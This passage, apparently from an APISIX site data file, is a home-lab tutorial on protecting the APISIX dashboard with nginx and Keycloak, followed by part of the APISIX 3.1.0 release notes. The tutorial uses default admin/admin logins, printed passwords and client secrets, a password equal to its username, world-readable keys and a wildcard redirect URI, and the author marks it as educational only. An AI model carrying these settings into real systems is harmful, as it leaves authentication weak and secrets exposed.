/home/sysop/H/hservcerts/k6k.crt;\\n    ssl_certificate_key /home/sysop/H/hservcerts/k6k.key;\\n\\n\\n    location / {\\n        index  index.html index.htm;\\n    }\\n\\n    error_page  404              /404.html;\\n\\n    # redirect server error pages to the static page /50x.html\\n    #\\n    error_page   500 502 503 504  /50x.html;\\n    location = /50x.html {\\n        root   /usr/share/nginx/html;\\n    }\\n\\n}\\n```\\n\\nRestart Nginx\\n\\n```\\nsudo systemctl restart nginx\\n```\\n\\nTry to access \u201chttps://k6k.h.net\u201d from a browser: the k6k base document will be showed\\n\\n### Add Keycloak Reverse Proxy\\n\\nIn the directory **\u201c/etc/nginx/conf.d\u201d** change the file **\u201ck6k.conf\u201d** to proxy keycloak\\n\\n```\\ncd /etc/nginx/conf.d\\nsudo vi k6k.conf\\n```\\n\\nThe file now contains\\n\\n```\\nserver {\\n\\n    listen 443 ssl http2;\\n    server_name k6k.h.net;\\n    root   /usr/share/nginx/k6k;\\n\\n    access_log  /var/log/nginx/k6k.access.log;\\n    error_log  /var/log/nginx/k6k.error.log;\\n\\n    ssl_certificate     /home/sysop/H/hservcerts/k6k.crt;\\n    ssl_certificate_key /home/sysop/H/hservcerts/k6k.key;\\n\\n    proxy_set_header Host $host;\\n    proxy_set_header X-Real-IP $remote_addr;\\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\\n    proxy_set_header X-Forwarded-Host $host;\\n    proxy_set_header X-Forwarded-Proto $scheme;\\n\\n    location / {\\n        proxy_pass http://127.0.0.1:8080;\\n    }\\n\\n    error_page  404              /404.html;\\n\\n    # redirect server error pages to the static page /50x.html\\n    #\\n    error_page   500 502 503 504  /50x.html;\\n    location = /50x.html {\\n        root   /usr/share/nginx/html;\\n    }\\n\\n}\\n```\\n\\nRestart Nginx\\n\\n```\\nsudo systemctl restart nginx\\n```\\n\\nRebuild keycloak for production\\n\\n```\\ncd ~/H/keycloak-20.0.1/bin/\\n./kc.sh --verbose build\\n```\\n\\nChange in **\u201c/usr/lib/systemd/system\u201d** the file named **\u201ckeycloak.service\u201d** with this content\\n\\n```\\n[Unit]\\nDescription=keycloak service\\nAfter=network.service\\n\\n[Service]\\nExecStart=/home/sysop/H/keycloak-20.0.1/bin/kc.sh start --proxy edge --hostname-strict=false >/var/log/keycloak.log 2>&1\\nPIDFile=/var/run/keycloak.pid\\n\\n[Install]\\nWantedBy=multi-user.target\\n```\\n\\nEnable and activate the service\\n\\n```\\nsudo systemctl daemon-reload\\nsudo systemctl restart keycloak\\n```\\n\\n## Apisix API Gateway\\n\\n### Addresses for apisix-dashboard\\n\\nThe address used is the exsternal address o the **hsrv** machine\\n\\nIn the **\\"/etc/hosts\\"** file of any machine accessing the cluster through the nginx reverse proxy add the line\\n\\n```\\n192.168.100.20 apisix apisix.h.net\\n```\\n\\nIn the DNS server on **hserv** add the apisix entry in the **\u201ch.net\u201d** DNS zone with address **\u201c192.168.100.20\u201d**\\n\\n![dns02](https://static.apiseven.com/uploads/2023/01/20/fAqZA2hy_7%20dns02.png)\\n\\n### APISIX Deployment\\n\\n> Work on **hdev**\\n\\ncreate a namespace for apisix\\n\\n```\\nkubectl create ns apisix\\n```\\n\\nAdd apisix helm repo\\n\\n```\\nmkdir ~/H/software/apisisx\\ncd ~/H/software/apisisx\\nhelm repo add apisix https://charts.apiseven.com\\nhelm repo update\\nhelm repo list\\n```\\n\\n> work on **hserv**\\n\\nOn **\u201chserv\u201d** create the CA kubernetes secret (make readable hservca.key)\\n\\n```\\ncd ~/H/hservcerts\\nls -lh hservca.*\\nkubectl -n apisix create secret generic hservcacert --from-file=cert=./hservca.pem\\nkubectl describe secret hservcacert -n apisix\\n```\\n\\n> work on **hdev**\\n\\nGet the core_dns service address and port (in this example 10.43.0.10:53)\\n\\n```\\nsysop@hdev:~/H/software/apisisx$ kubectl get svc -n kube-system\\nNAME              TYPE           CLUSTER-IP     EXTERNAL-IP                                                   PORT(S)                  AGE\\nkube-dns          ClusterIP      10.43.0.10     <none>                                                        53/UDP,53/TCP,9153/TCP   97d\\nmetrics-server    ClusterIP      10.43.64.71    <none>                                                        443/TCP                  97d\\ndocker-registry   LoadBalancer   10.43.183.18   192.168.101.21,192.168.101.22,192.168.101.23,192.168.101.24   5000:31397/TCP           92d\\nsysop@hdev:~/H/software/apisisx$\\n```\\n\\nGet the apisic helm chart the default values and put the output in a file named **apisix-values.yaml** then edit this file\\n\\n```\\ncd ~/H/software/apisisx\\nhelm show values apisix/apisix > apisix-values.yaml\\nvi apisix-values.yaml\\n```\\n\\nYou have to change:\\n\\n- the gateway type to **LoadBalancer** (my home lab is powered off every day and with the default gateway type of NodePort the Apisix gateway starts every day on a different node changing IP address)\\n- set the **tls** section to use the kubernetes secret with the private CA reference\\n- set the discovery section to use the kube-dns address found before (doing this enables apisix upstream definition to use the service name instead of the IP address)\\n- set a session secret in the httpSrv section as a workaround cited in the [#8068](https://github.com/apache/apisix/pull/8068) feature request\\n- enable (set to true) apisix dashboard and ingress-controller\\n\\nThe relevant tiles changed are:\\n\\n```\\ngateway:\\n  type: LoadBalancer\\n...\\n  tls:\\n    enabled: true\\n    servicePort: 443\\n    containerPort: 9443\\n    existingCASecret: \\"hservcacert\\"\\n    certCAFilename: \\"cert\\"\\n...\\ndiscovery:\\n  enabled: true\\n  registry:\\n    dns:\\n        servers:\\n            - \\"10.43.0.10:53\\"\\n...\\n   httpSrv: |\\n    set $session_secret 0123456789a5bac9bb3c868ec8b202e93;\\n...\\n\\ndashboard:\\n  enabled: true\\n\\ningress-controller:\\n  enabled: true\\n```\\n\\nInstall apisix using the new values.yaml file\\n\\n```\\nhelm install apisix apisix/apisix -f apisix-values.yaml \\\\\\n--set ingress-controller.config.apisix.serviceNamespace=apisix \\\\\\n--set ingress-controller.config.apisix.serviceName=apisix-admin \\\\\\n--set ingress-controller.config.kubernetes.apisixRouteVersion=apisix.apache.org/v2beta3 \\\\\\n--namespace apisix\\n```\\n\\nWait for the pods to start (it can take some time)\\n\\n```\\nkubectl -n apisix wait --for=condition=Ready pods --all\\nkubectl get pods -n apisix\\n```\\n\\nWhen all the Apisix pods will be in **Running** state the installation is completed\\n\\n### Accessing APISIX Dashboard\\n\\n> Work on **hdev**\\n\\nPort forward apisix-dashboard\\n\\n```\\nkubectl -n apisix port-forward service/apisix-dashboard 9090:80\\n```\\n\\nThe command output should be something like\\n\\n```\\nsysop@hdev:~$ kubectl -n apisix port-forward service/apisix-dashboard 9090:80\\nForwarding from 127.0.0.1:8080 -> 9000\\nForwarding from [::1]:8080 -> 9000\\n```\\n\\nThen access the dashboard on **\u201chdev\u201d** pointing the web browser to the url \u201chttp://localhost:9090\u201d\\nLogin with **\u201cadmin / admin\u201d**\\n\\n![ad01](https://static.apiseven.com/uploads/2023/01/20/INeavn6G_8%20ad01.png)\\n\\nVerify the dashboard version\\n\\n![ad02](https://static.apiseven.com/uploads/2023/01/20/2lzTvaa8_9ad02.png)\\n\\n## Create Apisix resources for apisix-dashboard\\n\\n### Create the certificate for **\\"apisix.h.net\\"**\\n\\n> Work on **hserv**\\n\\nIn the \u201c~/H/hservcerts/\u201d folder create the key and certificate for apisix.h.net\\n\\nCreate a file called **\\"apisixssl.cnf\\"** containing\\n\\n```\\n[req]\\ndefault_bits = 2048\\ndistinguished_name = req_distinguished_name\\nprompt = no\\n\\n[req_distinguished_name]\\nC = IT\\nST = Italy\\nL = Rome\\nO = Busico Mirto\\nOU = Laboratory\\nCN = apisix.h.net\\n\\n[v3_ca]\\nsubjectAltName = @alt_names\\n\\n[alt_names]\\nDNS.1 = apisix\\n# other names\\nDNS.2 = apisix.h.net\\nDNS.3 = apisix.ext.h.net\\nDNS.4 = apisix.int.h.net\\n```\\n\\nCreate the server private key and csr\\n\\n```\\nsudo openssl req -new -sha256 -nodes -newkey rsa:2048 -keyout apisix.key -out apisix.csr -config apisixssl.cnf\\n```\\n\\nCreate the certificate file.\\n\\n```\\nsudo openssl x509 -req -in apisix.csr -CA hservca.pem -CAkey hservca.key -CAcreateserial -out apisix.crt -sha256 -days 3650 -extfile apisixssl.cnf -extensions v3_ca\\n```\\n\\nChange the access rights for apisix key to permit nginx access\\n\\n```\\nsudo chmod a+r apisix.key\\n```\\n\\n### Apply certificates Nginx and enable HTTPS\\n\\n> Work on **hserv**\\n\\nCreate the root directory for apisix under nginx and create an index.html file in that directory\\n\\n```\\nsudo mkdir /usr/share/nginx/apisix\\nsudo chmod 777 /usr/share/nginx/apisix\\nvi /usr/share/nginx/apisix/index.html\\n```\\n\\nCreate a **index.html** file containing\\n\\n```\\n<!DOCTYPE html>\\n<html>\\n<text>\\n\\n<h1>apisix https default page</h1>\\n\\n</text>\\n</html>\\n```\\n\\nIn the directory **\u201c/etc/nginx/conf.d\u201d** create the file named **\u201capisix.conf\u201d**\\n\\n```\\ncd /etc/nginx/conf.d\\nsudo vi apisix.conf\\n```\\n\\nPut in the **\u201capisix.conf\u201d** file this content\\n\\n```\\nserver {\\n\\n    listen 443 ssl http2;\\n    server_name apisix.h.net;\\n    root   /usr/share/nginx/apisix;\\n\\n    access_log  /var/log/nginx/apisix.access.log;\\n    error_log  /var/log/nginx/apisix.error.log;\\n\\n    ssl_certificate     /home/sysop/H/hservcerts/apisix.crt;\\n    ssl_certificate_key /home/sysop/H/hservcerts/apisix.key;\\n\\n\\n    location / {\\n        index  index.html index.htm;\\n    }\\n\\n    error_page  404              /404.html;\\n\\n    # redirect server error pages to the static page /50x.html\\n    #\\n    error_page   500 502 503 504  /50x.html;\\n    location = /50x.html {\\n        root   /usr/share/nginx/html;\\n    }\\n\\n}\\n```\\n\\nRestart Nginx\\n\\n```\\nsudo systemctl restart nginx\\n```\\n\\nAdd the apisix line in \u201c/etc/hosts\u201d on any machine that will access apisix-dashboard\\n\\n```\\n192.168.100.20 apisix.h.net\\n```\\n\\nAdd the apisix A record in the DNS in \u201ch.net\u201d zone\\n\\n![ad03](https://static.apiseven.com/uploads/2023/01/20/sXSh4zpz_10ad03.png)\\n\\nAccess \u201chttps://apisix.h.net\u201d from a browser and the apisix default page should be presented\\n\\n### Create the load balancer definition\\n\\n> Work on **hserv**\\n\\nIn the directory **\u201c/etc/nginx/conf.d\u201d** modify the file **\u201capisix.conf\u201d**\\n\\n```\\ncd /etc/nginx/conf.d\\nsudo vi apisix.conf\\n```\\n\\nPut in the file this content\\n\\n```\\nupstream hcluster {\\n    ip_hash;\\n    server 192.168.101.22:443;\\n    server 192.168.101.23:443;\\n    server 192.168.101.24:443;\\n}\\n\\n\\nserver {\\n\\n    listen 443 ssl http2;\\n    server_name apisix.h.net;\\n    root   /usr/share/nginx/apisix;\\n\\n    access_log  /var/log/nginx/apisix.access.log;\\n    error_log  /var/log/nginx/apisix.error.log;\\n\\n    ssl_certificate     /home/sysop/H/hservcerts/apisix.crt;\\n    ssl_certificate_key /home/sysop/H/hservcerts/apisix.key;\\n\\n    proxy_busy_buffers_size   512k;\\n    proxy_buffers   4 512k;\\n    proxy_buffer_size   256k;\\n\\n    proxy_set_header Host $host;\\n    proxy_ssl_server_name on;\\n    proxy_ssl_name apisix.h.net;\\n    proxy_set_header X-Real-IP $remote_addr;\\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\\n    proxy_set_header X-Forwarded-Host $host;\\n    proxy_set_header X-Forwarded-Proto $scheme;\\n\\n    location / {\\n        proxy_pass https://hcluster;\\n    }\\n\\n    error_page  404              /404.html;\\n\\n    # redirect server error pages to the static page /50x.html\\n    #\\n    error_page   500 502 503 504  /50x.html;\\n    location = /50x.html {\\n        root   /usr/share/nginx/html;\\n    }\\n\\n}\\n```\\n\\n> **Note:**\\n>\\n> the lines\\n\\n```\\nupstream hcluster {\\n    ip_hash;\\n    server 192.168.101.22:443;\\n    server 192.168.101.23:443;\\n    server 192.168.101.24:443;\\n}\\n```\\n\\n> use the internal address of the three kubernetes worker nodes and it is necessary to specify the 443 port to enable https traffic\\n>\\n> The lines\\n\\n```\\n    proxy_busy_buffers_size   512k;\\n    proxy_buffers   4 512k;\\n    proxy_buffer_size   256k;\\n```\\n\\n> are required because, after the Keycloak authentication, the apisix server replyes with the state in the URL.\\n>\\n> With the default values nginx replies with a \\"response too big\\" error\\n\\nRestart Nginx\\n\\n```\\nsudo systemctl restart nginx\\n```\\n\\nAccess \u201chttps://apisix.h.net\u201d from a browser. You should receive page not found error because there is no route in Apisix\\n\\n### Create \u201capisix-dashboard\u201d route and upstream with apisix-dashboard\\n\\n> Work on **hdev**\\n\\nport forward apisix-dashboard and access it at \u201chttp://localhost:9090\u201d and login with **\u201cadmin\u201d / \\"admin\u201c**\\n\\n```\\nkubectl -n apisix port-forward service/apisix-dashboard 9090:80\\n```\\n\\nFind the apisix-dashboard service name and port\\n\\n```\\nsysop@hdev:~/H/hservcerts$ kubectl get svc -n apisix\\nNAME                        TYPE           CLUSTER-IP      EXTERNAL-IP                                                   PORT(S)                      AGE\\napisix-etcd-headless        ClusterIP      None            <none>                                                        2379/TCP,2380/TCP            12h\\napisix-etcd                 ClusterIP      10.43.75.4      <none>                                                        2379/TCP,2380/TCP            12h\\napisix-ingress-controller   ClusterIP      10.43.170.105   <none>                                                        80/TCP                       12h\\napisix-dashboard            ClusterIP      10.43.48.202    <none>                                                        80/TCP                       12h\\napisix-admin                ClusterIP      10.43.169.123   <none>                                                        9180/TCP                     12h\\napisix-gateway              LoadBalancer   10.43.161.47    192.168.101.21,192.168.101.22,192.168.101.23,192.168.101.24   80:30508/TCP,443:32653/TCP   12h\\nsysop@hdev:~/H/hservcerts$\\n```\\n\\nCreate an upstream\\n\\n![ad04](https://static.apiseven.com/uploads/2023/01/20/awmMSYaW_11ad04.png)\\n\\nSet the name to **\u201capisix-dashboard\u201d**, upstream type to **\u201cservice discovery\u201d**, discovery type to **\u201cdns\u201d** and servicename to **\u201capisix-dashboard.apisix.svc.cluster.local:80\u201d**.\\n\\n![ad05](https://static.apiseven.com/uploads/2023/01/20/HAQw19MF_12ad05.png)\\n\\nThen click \u201cNext\u201d and after click \u201cSubmit\u201d\\n\\nClick \u201cView\u201d to see the json upstream definition\\n\\n![ad06](https://static.apiseven.com/uploads/2023/01/20/2K7p0bZi_13ad06.png)\\n\\nNote the upstream name to be used in the next route definition\\n\\n![ad07](https://static.apiseven.com/uploads/2023/01/20/TduSqV0m_14ad07.png)\\n\\nNow click \u201cCreate\u201d on the \u201cRoute\u201d page\\n\\n![ad08](https://static.apiseven.com/uploads/2023/01/20/fuSqIVlL_15ad08.png)\\n\\nCreate a route (\\"Define api request\\" - on top): set name to \u201capisix-dashboard\u201d and add a description\\n\\n![ad09](https://static.apiseven.com/uploads/2023/01/20/TEQaia56_16ad09.png)\\n\\nCreate a route (\\"Define api request\\" - below): set host to **\u201capisix.h.net\u201d** and path to **\u201c/*\u201d**. Then click **\u201cNext\u201d**\\n\\n![ad10](https://static.apiseven.com/uploads/2023/01/20/U2C0nK9H_17ad10.png)\\n\\nSelect the previous defined \u201capisix\u201d upstream from the dropdown list. Then click \u201cNext\u201d\\n\\n![ad11](https://static.apiseven.com/uploads/2023/01/20/aTCu1mIe_18ad11.png)\\n\\nFor now don\u2019t use plugins and click \u201cNext\u201d. Then click \u201cSubmit\u201d\\n\\n![ad12](https://static.apiseven.com/uploads/2023/01/20/Z6m7MicN_19ad12.png)\\n\\n### Enable https in apisix\\n\\n> Work on **hserv**\\n\\nCopy the certificates from hserv to hdev. From hserv:\\n\\n```\\nsysop@hserv:~$ cd ~/H\\nsysop@hserv:~/H$ rsync -vau --stats ./hservcerts/* hdev.int.h.net://home/sysop/H/hservcerts/\\n```\\n\\n> Work on **hdev**\\n\\nPort forward apisix-dashboard and access it ah \u201chttp://localhost:9090\u201d and login with **\u201cadmin\u201d / \\"admin\u201c**\\n\\n```\\nkubectl -n apisix port-forward service/apisix-dashboard 9090:80\\n```\\n\\nSelect the \u201cSSL\u201d page and click Create\\n\\n![ad14](https://static.apiseven.com/uploads/2023/01/20/dEVd2rD6_20ad14.png)\\n\\nSelect **\u201cWay: Upload\u201d**, then click **\u201cupload certificate\u201d** and **\u201cupload key\u201d**. Clik \u201cNext\u201d (Take certificate and key files from **~/H/hservcerts**)\\n\\n![ad15](https://static.apiseven.com/uploads/2023/01/20/cBHW3QQH_21ad15.png)\\n\\nPreview the SSL resource and click \u201cSubmit\u201d\\n\\n![ad16](https://static.apiseven.com/uploads/2023/01/20/5y67o7w7_22ad16.png)\\n\\nThe ssl resource appear in the list (note the SNI values)\\n\\n![ad17](https://static.apiseven.com/uploads/2023/01/20/0QcDTVt7_23ad17.png)\\n\\nConfigure the \u201capisix-dashboard\u201d route to enable http to https redirection\\n\\n![ad18](https://static.apiseven.com/uploads/2023/01/20/rxL1HGlY_24ad18.png)\\n\\nSet the **\u201cRedirect\u201d** field to **\u201cEnable HTTPS\u201d**. Then click \u201cNext\u201d until you see \u201cSubmit\u201d. Click \u201cSubmit\u201d\\n\\n![ad19](https://static.apiseven.com/uploads/2023/01/20/iD0XRe4A_25ad19.png)\\n\\nView the route configuration and verify that the redirect plugin is enabled\\n\\n![ad20](https://static.apiseven.com/uploads/2023/01/20/8I9QKdZj_26ad20.png)\\n\\nNow from any machine you can access the apisix-dashboard at the url **\u201chttps://apisix.h.net\u201d** and verify that the apisix-dashboard login page is showed\\n\\n![ad21](https://static.apiseven.com/uploads/2023/01/20/WYwVhc6V_27ad21.png)\\n\\nLogin with \u201cadmin\u201d / \u201cadmin\u201d\\n\\n![ad22](https://static.apiseven.com/uploads/2023/01/20/33gBSogM_28ad22.png)\\n\\n#### Create Keycloak Definitions for OpenID-Connect\\n\\n> Work on any machine\\n\\nWorking on any machine, access the keycloak console at  \u201chttps://k6k.h.net\u201d and login with \u201cadmin\u201d / \\"1357Togo\u201c\\n\\nClick \u201cCreate Realm\u201d\\n\\n![k6k04](https://static.apiseven.com/uploads/2023/01/20/rgM4S46s_29k6k04.png)\\n\\nCreate a realm named **\u201chcluster_admins\u201d**\\n\\n![k6k05](https://static.apiseven.com/uploads/2023/01/20/WGPQt7eY_30k6k05.png)\\n\\nCreate a client named **\u201chcadmins\u201d**\\n\\n![k6k06](https://static.apiseven.com/uploads/2023/01/20/nSIDqrMz_31k6k06.png)\\n\\nVerify that the client protocol is **\u201copenid-connect\u201d** and click \u201cNext\u201d\\n\\n![k6k07](https://static.apiseven.com/uploads/2023/01/20/5FMWvLiZ_32k6k07.png)\\n\\nSet \u201cClient authentication\u201d to \\"on\\" (means OIDC type confidential). Click \u201cSave\u201d\\n\\n![k6k08](https://static.apiseven.com/uploads/2023/01/20/OPLxpYCZ_33k6k08.png)\\n\\nIn **\u201cCient details\u201d**, **\u201cSettings\u201d** tab, **\u201caccess settings\u201d** section, set **\u201cValid redirect URI\u201d** to **\u201c*\u201d**. Click **\u201cSave\u201d**\\n\\n![k6k09](https://static.apiseven.com/uploads/2023/01/20/ZtOy06uu_34k6k09.png)\\n\\nCreate a new user\\n\\n![k6k10](https://static.apiseven.com/uploads/2023/01/20/2MPpK4Xw_35k6k10.png)\\n\\nSet the username to **\u201chcadmin\u201d** and click **\u201cCreate\u201d**\\n\\n![k6k11](https://static.apiseven.com/uploads/2023/01/28/YEwkpnnp_k6k11.png)\\n\\nIn the **\u201cCredentials\u201d** tab click **\u201cSet password\u201d** (same procedure for \\"Reset\\" password)\\n\\n![k6k12](https://static.apiseven.com/uploads/2023/01/20/HzbaXwUN_37k6k12.png)\\n\\nSet a permanent (Temporary set to Off) password to **\u201chcadmin\u201d** (equal to the username)\\n\\n![k6k13](https://static.apiseven.com/uploads/2023/01/20/fS53TVta_38k6k13.png)\\n\\n#### Get Client ID and Secret\\n\\nSelect **hcadmins** client. Go to **Credentials** tab; show the Secret and copy the client id and secret to be used in the next steps\\n\\nclient ID: **hcadmins**\\n\\nSecret: **MoqLUhwgsEDi36II0KuJldKq4YGLHxl3**\\n\\n![k6k14](https://static.apiseven.com/uploads/2023/01/20/TSporVZx_39k6k14.png)\\n\\nIn the **\u201cRealm settings\u201d**, **\u201cGeneral\u201d** tab click on the link **\u201cOpenID Endpoint Configuration\u201d**\\n\\n![k6k15](https://static.apiseven.com/uploads/2023/01/20/MiFQHqS0_40k6k15.png)\\n\\nThis is the shown page\\n\\n![k6k16](https://static.apiseven.com/uploads/2023/01/20/IQDtB8NP_41k6k16.png)\\n\\nCopy the link\\n\\n```\\nhttps://k6k.h.net/realms/hcluster_admins/.well-known/openid-configuration\\n```\\n\\nPrepare a json client definition using the previous copied information\\n\\n```\\n{\\n    \\"client_id\\":\\"hcadmins\\",\\n    \\"client_secret\\":\\"MoqLUhwgsEDi36II0KuJldKq4YGLHxl3\\",\\n    \\"discovery\\":\\"https://k6k.h.net/realms/hcluster_admins/.well-known/openid-configuration\\",\\n    \\"scope\\":\\"openid profile\\",\\n    \\"bearer_only\\":false,\\n    \\"realm\\":\\"hcluster_admins\\",\\n    \\"introspection_endpoint_auth_method\\":\\"client_secret_post\\",\\n    \\"redirect_uri\\":\\"https://apisix.h.net/*\\",\\n    \\"access_token_in_authorization_header\\":true\\n}\\n```\\n\\n#### OpenID-Connect for APISIX Dashboard\\n\\n> Work on any machine\\n\\nConfigure the apisix-dashboard route.\\n\\nGo to **\u201c3 Plugin config\u201d**\\n\\n![ad23](https://static.apiseven.com/uploads/2023/01/20/fRBFq9qA_42ad23.png)\\n\\nClick **\u201cEnable\u201d** on openid-connect plugin (if you have already defined the plugin you\'ll see \\"Edit\\" instead of \\"Enable\\")\\n\\n![ad24](https://static.apiseven.com/uploads/2023/01/20/yh2HtjSR_43ad24.png)\\n\\nEnable the plugin. Copy the previous defined json definition and click **\u201cSubmit\u201d**\\n\\n![ad25](https://static.apiseven.com/uploads/2023/01/20/DSqrLV7K_44ad25.png)\\n\\nClik \\"next\\" and then clik \\"Submit\\" to complete the route configuration\\n\\nThen \\"view\\" the route to see the plugin configuration\\n\\n![ad26](https://static.apiseven.com/uploads/2023/01/20/hFGRuPmq_45ad26.png)\\n\\n### Accessing the Protected APISIX Dashboard Route\\n\\n> Work on any machine\\n\\nGo to the URL\\n\\n```\\nhttps://apisix.h.net\\n```\\n\\nYou will be redirected to the Keycloak login page for the \\"HCLUSTER_ADMINS\\" realm.\\nLogin with the previous defined user \\"hcadmin\\" / \\"hcadmin\\"\\n\\n![ad27](https://static.apiseven.com/uploads/2023/01/20/fs5u4nNI_46ad27.png)\\n\\nThe apisix-dashboard login will be presented. Login with \\"admin\\" / \\"admin\\"\\n\\n![ad28](https://static.apiseven.com/uploads/2023/01/20/RnoBom2u_47ad28.png)\\n\\nAnd now you can see the apisix dashboard\\n\\n![ad29](https://static.apiseven.com/uploads/2023/01/20/dFEXeiAE_48ad29.png)\\n\\n## Recap\\n\\nIn this article were presented the intruction to:\\n\\n- set up a Certification authority and create key and certificates for various sites\\n- set up a nginx server as reverse proxy and load balancer\\n- set up a Keycloak server accessible through a nginx reverse proxy\\n- set up Apisix in a kubernetes cluster with ingress-controller and apisix-dashboard\\n- set up the authentication framework in Keycloak to access the apisix-dashboard\\n- set up the nginx load balancer for apisix-dashboard inside kubernetes\\n- set up the apisix resources, including openid-connect plugin, to access the apisix-dashboard with authentication provided by the keycloak server\\n\\nNote that this set up is only for educational purpose. Do not use in production."},{"id":"Release Apache APISIX 3.1.0","metadata":{"permalink":"/blog/2022/12/30/release-apache-apisix-3.1.0","source":"@site/blog/2022/12/30/release-apache-apisix-3.1.0.md","title":"Release Apache APISIX 3.1.0","description":"Apache APISIX 3.1.0 is officially released! This version brings a lot of functional support on the security level and adds a built-in debugging plugin, to optimize the experience of using APISIX.","date":"2022-12-30T00:00:00.000Z","formattedDate":"December 30, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":5.945,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://github.com/spacewander.png","imageURL":"https://github.com/spacewander.png"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Accessing APISIX-Dashboard from Everywhere with Keycloak Authentication","permalink":"/blog/2023/01/02/accessing_apisix-dashboard_from_everywhere_with_keycloak_authentication"},"nextItem":{"title":"Web resource caching: Server-Side","permalink":"/blog/2022/12/14/web-caching-server"}},"content":"> Apache APISIX 3.1.0 is officially released! This version brings a lot of functional support on the security level and adds a built-in debugging plugin, to optimize the experience of using APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\nAfter a month, a new version is here. This time APISIX 3.1.0 is the first new version since the big 3.0 release. As always, in the new era of 3.x, we present you with more new features in each version.\\n\\nThis release, 3.1.0, adds support for encrypted storage of plugin configurations and storage on external security services, focusing on enabling users to use their configurations more securely and with greater confidence. On top of this, we have also introduced several new features designed to optimize your experience with APISIX.\\n\\n## New feature: encrypted storage of plugin configuration\\n\\nThe new version supports encrypted storage of plugin-specific fields in etcd.\\n\\nIn previous versions, APISIX provided a `key_encrypt_salt` configuration item to support encryption of SSL keys stored inside etcd to avoid storing private key data in plaintext.\\n\\nAfter all, for sensitive data such as private keys, one less place to store plaintext can provide more peace of mind. So for other equally sensitive configurations, such as the secret in the `jwt-auth` plugin, can we also encrypt it to avoid storing it in plaintext in etcd?\\n\\nVersion 3.1 extends the encrypted storage feature to other fields. With this feature, we can specify the fields that need to be encrypted on a particular plugin and then turn on encryption in the config.yaml file to avoid storing plaintext.\\n\\nAs an example, we add the following token to the `jwt-auth` plugin.\\n\\n```lua\\n     encrypt_fields = {\\"secret\\", \\"private_key\\"},\\n```\\n\\nWhen we enable encryption of fields in `config.yaml`:\\n\\n```yaml\\napisix:\\n    data_encryption:\\n        enable: true\\n        keyring:\\n            - edd1c9f0985e76a2\\n```\\n\\nThen the secret and private_key in the configuration of the `jwt-auth` plugin written to etcd will be stored encrypted. The configuration seen via `etcdctl get --prefix /` will be something like \\"\\"secret\\": \\"77+NmbYqNfN+oL...\\"\\" Instead of the original configuration information, this is the data.\\n\\n## New feature: storing sensitive information in an external security service\\n\\nIn addition to storing sensitive information encrypted in etcd, there is also the option to dynamically retrieve sensitive information from another system instead of requiring it to be stored in APISIX\'s configuration store (e.g. etcd).\\n\\nIn version 3.1, we introduced a feature called APISIX Secret, which allows users to store secret in APISIX through some key management services (Vault, etc.) and read it according to the key at the time of use, ensuring that the secret does not exist in plaintext throughout the platform.\\n\\nAPISIX currently supports storing secret through the following methods.\\n\\n- Environment variables\\n- HashiCorp Vault\\n\\n### Related examples\\n\\nUsing the `key-auth` plugin as an example, let\'s demonstrate how to use the feature.\\n\\n#### Environment variable-based sensitive information storage\\n\\nStep 1: Create environment variables before starting the APISIX instance\\n\\n```shell\\nexport JACK_AUTH_KEY=abc\\n```\\n\\nStep 2: Reference the environment variables in the `key-auth` plugin\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/consumers \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"username\\": \\"jack\\",\\n    \\"plugins\\": {\\n        \\"key-auth\\": {\\n            \\"key\\": \\"$ENV://JACK_AUTH_KEY\\"\\n        }\\n    }\\n}\'\\n```\\n\\nThe above steps allow you to save the key configuration in the `key-auth` plugin in an environment variable instead of explicitly displaying it when configuring it.\\n\\n#### Vault-based storage of sensitive information\\n\\nStep 1: Create the corresponding configuration in Vault, which can be done with the following command.\\n\\n```shell\\nvault kv put apisix/jack auth-key=value\\n```\\n\\nStep 2: Add the Secret resource via the Admin API and configure the Vault\'s address and other connection information.\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/secrets/vault/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"https://127.0.0.1:8200\\"\uff0c\\n    \\"prefix\\": \\"apisix\\",\\n    \\"token\\": \\"root\\"\\n}\'\\n```\\n\\nStep 3: Refer to the APISIX Secret resource in the `key-auth` plugin and populate the location in the Vault with the following configuration.\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/consumers \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"username\\": \\"jack\\",\\n    \\"plugins\\": {\\n        \\"key-auth\\": {\\n            \\"key\\": \\"$secret://vault/1/jack/auth-key\\"\\n        }\\n    }\\n}\'\\n```\\n\\nWith the above steps, you can save the key configuration in the `key-auth` plugin in the Vault instead of explicitly displaying it when configuring it.\\n\\n## New Feature: Experimental gRPC-based etcd Configuration Synchronization\\n\\nIn this new release, we have also introduced experimental gRPC-based etcd configuration synchronization. The current APISIX configuration for synchronizing etcd is based on HTTP long pulling, which requires etcd to have gRPC-gateway enabled (fortunately, it is enabled by default).\\n\\nIn practice, we encountered problems with etcd\'s HTTP API, perhaps because synchronizing the configuration via HTTP is not the mainstream way of using etcd, so it is more likely to encounter bugs.\\n\\nIn addition, since gRPC itself provides multiplexing support, switching to gRPC synchronization can significantly reduce the number of APISIX connections to etcd.\\n\\nCurrently, APISIX synchronization requires a separate HTTP connection for each type of configuration. Switching to gRPC results in only one connection per process for configuration synchronization (two if the L4 proxy is enabled).\\n\\nTo enable experimental gRPC-based configuration synchronization, set `use_grpc: true` in the configuration file `config.yaml`.\\n\\n```yaml\\n  etcd:\\n    use_grpc: true\\n    timeout: 3600\\n    host:\\n      - \\"http://127.0.0.1:2379\\"\\n    prefix: \\"/apisix\\"\\n```\\n\\n## New Feature: Consul-based Service Discovery\\n\\nIn previous versions of APISIX, enthusiastic contributors provided a Consul KV-based service discovery 